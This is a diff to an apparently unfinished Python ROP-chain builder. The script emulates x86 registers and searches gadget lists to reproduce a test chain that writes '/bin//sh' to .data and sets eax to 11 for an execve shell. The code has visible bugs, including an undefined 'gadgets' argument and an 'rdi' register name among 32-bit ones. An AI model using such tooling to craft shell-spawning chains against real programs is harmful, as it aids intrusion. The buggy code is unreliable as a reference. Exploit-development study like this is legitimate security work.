@@ -9,6 +9,7 @@ SPOINT_NAME = "esp"
 SBASE_NAME = "ebp"
 SOURCE_NAME = "esi"
 DEST_NAME = "rdi"
+registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]
 
 class SysState:
     acc = None
@@ -27,7 +28,7 @@ class SysState:
         print("Creating New SysState Object...")
 
     def printSystem(self):
-        print(ACC_NAME + " : " + str(int.from_bytes(self.acc, "little")))
+        print(ACC_NAME + " : " + str(self.acc))
         print(COUNT_NAME + " : " + str(self.count))
         print(DATA_NAME + " : " + str(self.data))
         print(BASE_NAME + " : " + str(self.base))
@@ -75,12 +76,12 @@ def generalToBytes(value):
 
 def writeToData(state, position, value):
     numBytes = len(value)
-    pos = int(position.lstrip(" .dat+") or 0)
+    pos = int(position.lstrip("@ .dat+") or 0)
     state.datavalues = state.datavalues[:pos] + value + state.datavalues[pos + numBytes:]
     return
 
 def setToLoc(state, name, value):
-    print("set " + name)
+    print("set " + name + " to " + str(value))
     if name == ACC_NAME:
         state.acc = value
     if name == COUNT_NAME:
@@ -97,7 +98,7 @@ def setToLoc(state, name, value):
         state.source = value
     if name == DEST_NAME:
         state.dest = value
-    if name[0:5] == ".data":
+    if name[0:7] == "@ .data":
         writeToData(state, name, value)
     if name[0:11] == "dword ptr [":
         setToLoc(state, getFromLoc(state, name[11:14]), value)
@@ -127,6 +128,7 @@ def endpop(state, v):
     state.popped.pop(0)
 
 def transition(state, instruction):
+    print(instruction)
     if type(instruction) is bytes:
         endpop(state, instruction)
         return state
@@ -144,10 +146,14 @@ def transition(state, instruction):
     if command[0:3] == "pop":
         pop(state, command[4:])
     if command[0:1] == "@":
-        endpop(state, command[2:])
+        endpop(state, command)
+    if command[0:3] == "nop":
+        return state
     return state
 
 def run(state, shellcode):
+    print("running:")
+    print(shellcode)
     for instruction in shellcode:
         transition(state, instruction)
 
@@ -157,35 +163,42 @@ def createGoal(shellcode):
     return goal
 
 def getWriterRegisters(gadget):
-    r1 = gadget[15:18]
-    r2 = gadget[21:24]
-    return r1, r2
+    dest = gadget[15:18]
+    source = gadget[21:24]
+    return dest, source
 
 def writeExecutionSearch(startstate, endstate, Gadgets):
     execution = []
     success = False
 
     #Find all writing gadgets
-    writers = filter(lambda x: ("mov dword ptr [" in x), Gadgets)
+    writers = [x for x in Gadgets if "mov dword ptr [" in x]
+    #writers = filter(lambda x: ("mov dword ptr [" in x), Gadgets)
+    print("writing gadgets:")
     print(writers)
 
     #Get Location to write to
     writeLocation = ".data"
+    print("write location:")
+    if len(startstate.datavalues) != 0:
+        writeLocation += " + " + str(len(startstate.datavalues))
+    print(writeLocation)
 
     #Get data to write
     writeData = endstate.datavalues[-4:]
+    print(writeData)
 
     #Attempt to find executions which set registers for each write gadget
     for w in writers:
         locationreg, valuereg = getWriterRegisters(w)
         setGoal = copy.deepcopy(startstate)
-        setToLoc(setGoal, locationreg, ".data")
+        setToLoc(setGoal, locationreg, "@ " + writeLocation)
         setToLoc(setGoal, valuereg, writeData)
-        setexec = setExecutionSearch(startstate, setGoal)
+        setexec = setExecutionSearch(startstate, setGoal, Gadgets)
         if len(setexec) > 0:
             success = True
             execution = setexec
-            execution += w
+            execution.append(w.split(';')[0].rstrip())
             break
 
     #Add execution which sets registers to desired endstate
@@ -195,23 +208,45 @@ def writeExecutionSearch(startstate, endstate, Gadgets):
         return []
     return execution
 
+def popcontrol(Gadgets):
+    control = [False] * len(registers)
+    print(Gadgets)
+    for i, r in enumerate(registers):
+        if ("pop " + r + " ; ret") in Gadgets:
+            control[i] = True
+    return control
+
 def setExecutionSearch(startstate, endstate, Gadgets):
     success = False
     execution = []
-    
 
+    registersToSet = [x != y for x, y in zip(startstate.allRegisters(), endstate.allRegisters())]
+    popcontrolled = popcontrol(Gadgets)
+    print(registersToSet)
+    print(popcontrolled)
+    if [(x == False or y == True) for x, y in zip(registersToSet, popcontrolled)] == [True] * len(registersToSet):
+        print(registersToSet)
+        for i, r in enumerate(registers):
+            if registersToSet[i] == True:
+                execution.append("pop " + r)
+                execution.append(getFromLoc(endstate, r))
+        success = True
+    print(execution)
     if success == False:
         return []
     return execution
 
 def findExecution(startstate, endstate, Gadgets):
-    return []
+    startstate.printSystem()
+    if startstate.datavalues != endstate.datavalues:
+        return writeExecutionSearch(startstate, endstate, Gadgets)
+    return setExecutionSearch(startstate, endstate, Gadgets)
 
 
 #shellcode should be a list of assembly instructions as strings
 #gadgets should be a list of gadgets that will be available as strings
 def create(shellcode, gadgets):
-    singulargadgets = filter(lambda x: x.count(';') < 2, gadgets)
+    singulargadgets = [x for x in gadgets if x.count(';') < 2]
 
     #Generate Goal State
     Goal = createGoal(shellcode)
@@ -228,44 +263,31 @@ def create(shellcode, gadgets):
     #Load to .data
     while Goal.datavalues != System.datavalues:
         SubGoal = copy.deepcopy(System)
-        SubGoal.datavalues = Goal.datavalues[:len(System.datavalues)]
+        SubGoal.datavalues = Goal.datavalues[:len(System.datavalues)+4]
         section = findExecution(System, SubGoal, singulargadgets)
-        execution.append(section)
+        if len(section) == 0:
+            print("Failed to write to data")
+            quit()
+        else:
+            print("Added data write")
+        System.printSystem()
+        execution.extend(section)
+        print(section)
         run(System, section)
-
+        System.printSystem()
+        
     #Load register values
-    execution.append(findExecution(System, Goal, singulargadgets))
-
+    execution.extend(findExecution(System, Goal, singulargadgets))
+    print(execution)
+    TestSystem = SysState()
+    run(TestSystem, execution)
+    TestSystem.printSystem()
     #Return Sequence of Gadgets
     return execution
 
 if __name__ == "__main__":
-    TestSystem = SysState()
-    transition(TestSystem, "pop edx")
-    transition(TestSystem, "@ .data")
-    transition(TestSystem, "pop eax")
-    transition(TestSystem, b'/bin')
-    transition(TestSystem, "mov dword ptr [edx], eax")
-    transition(TestSystem, "pop edx")
-    transition(TestSystem, "@ .data + 4")
-    transition(TestSystem, "pop eax")
-    transition(TestSystem, b'//sh')
-    transition(TestSystem, "mov dword ptr [edx], eax")
-    transition(TestSystem, "pop edx")
-    transition(TestSystem, "@ .data + 8")
-    transition(TestSystem, "xor eax, eax")
-    transition(TestSystem, "mov dword ptr [edx], eax")
-    transition(TestSystem, "pop ebx")
-    transition(TestSystem, "@ .data")
-    run(TestSystem, ["pop ecx", "pop ebx"])
-    transition(TestSystem, "@ .data + 8")
-    transition(TestSystem, "@ .data")
-    transition(TestSystem, "pop edx")
-    transition(TestSystem, "@ .data + 8")
-    transition(TestSystem, "xor eax, eax")
-    run(TestSystem, ["inc eax"]*11)
-    TestSystem.printSystem()
+    #gadgets = ["pop edx ; ret", "pop eax ; ret", "mov dword ptr [edx], eax ; ret", "xor eax, eax ; ret", "pop ebx ; ret", "pop ecx ; ret"]
+    
 
-
-    #print("CREATE TEST")
-    #create(["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11, None)
+    print("CREATE TEST")
+    create(["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11, gadgets)
